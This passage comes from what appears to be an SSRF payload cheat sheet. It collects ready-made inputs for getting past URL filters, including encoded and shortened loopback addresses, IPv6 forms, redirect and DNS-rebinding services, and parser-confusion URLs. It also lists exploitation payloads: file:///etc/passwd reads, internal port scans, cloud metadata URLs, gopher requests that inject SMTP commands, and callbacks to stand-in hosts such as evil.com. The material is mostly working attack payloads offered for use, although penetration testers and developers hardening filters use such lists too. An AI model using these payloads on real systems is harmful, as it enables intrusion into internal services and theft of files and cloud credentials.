
## Bypassing Filters
### Default Targets

* Using `localhost`

  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```

* Using `127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```

* Using `0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```

### Bypass Localhost with IPv6 Notation

* Using unspecified address in IPv6 `[::]`

    ```powershell
    http://[::]:80/
    ```

* Using IPv6 loopback addres`[0000::1]`

    ```powershell
    http://[0000::1]:80/
    ```

* Using [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```

### Bypass Localhost with a Domain Redirect

| Domain                       | Redirect to |
|------------------------------|-------------|
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

The service `nip.io` is awesome for that, it will convert any ip address as a dns.

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### Bypass Localhost with CIDR

The IP range `127.0.0.0/8` in IPv4 is reserved for loopback addresses.

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

If you try to use any address in this range (127.0.0.2, 127.1.1.1, etc.) in a network, it will still resolve to the local machine

### Bypass Using Rare Address

You can short-hand IP addresses by dropping the zeros

```powershell
http://0/
http://127.1
http://127.0.1
```

### Bypass Using an Encoded IP Address

* Decimal IP location

    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* Octal IP: Implementations differ on how to handle octal format of IPv4.

    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```

* Hex IP

    ```powershell
    http://0x7f000001 = http://127.0.0.1
    http://0xc0a80101 = http://192.168.1.1
    http://0xa9fea9fe = http://169.254.169.254
    ```

### Bypass Using Different Encoding

* URL encoding: Single or double encode a specific URL to bypass blacklist

    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`

    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.

### Bypassing via ipv6 hostname

* in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6

   ```powershell
   http://ip6-localhost = ::1
   http://ip6-loopback = ::1
   ```

### Bypassing Using a Redirect

1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
2. Launch the SSRF pointing to `vulnerable.com/index.php?url=http://redirect-server`
3. You can use response codes [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.

To perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use [Horlad/r3dir](https://github.com/Horlad/r3dir).

* Redirects to `http://localhost` with `307 Temporary Redirect` status code

    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code

    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```

### Bypass Using DNS Rebinding

Create a domain that change between two IPs.

* [1u.ms](http://1u.ms) - DNS rebinding utility

For example to rotate between `1.2.3.4` and `169.254-169.254`, use the following domain:

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

Verify the address with `nslookup`.

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

### Bypass Abusing URL Parsing Discrepancy

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

Parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`

* `urllib2` treats `1.1.1.1` as the destination
* `requests` and browsers redirect to `2.2.2.2`
* `urllib` resolves to `3.3.3.3`
* Some parsers replace http:127.0.0.1/ to http://127.0.0.1/

### Bypass PHP filter_var() Function

In PHP 7.0.25, `filter_var()` function with the parameter `FILTER_VALIDATE_URL` allows URL such as:

* `http://test???test.com`
* `0://evil.com:80;http://google.com:80/`

```php
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

### Bypass Using JAR Scheme

This attack technique is fully blind, you won't see the result.

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## Exploitation via URL Scheme

### File

Allows an attacker to fetch the content of a file on the server. Transforming the SSRF into a file read.

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### HTTP

Allows an attacker to fetch any content from the web, it can also be used to scan ports.

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```
### Dict

The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP

A network protocol used for secure file transfer over secure shell

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

Trivial File Transfer Protocol, works over UDP

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Netdoc

Wrapper for Java when your payloads struggle with "`\n`" and "`\r`" characters.

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### Gopher

The `gopher://` protocol is a lightweight, text-based protocol that predates the modern World Wide Web. It was designed for distributing, searching, and retrieving documents over the Internet.

```ps1
gopher://[host]:[port]/[type][selector]
```

This scheme is very useful as it as be used to send data to TCP protocol.

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

Refer to the SSRF Advanced Exploitation to explore the `gopher://` protocol deeper.

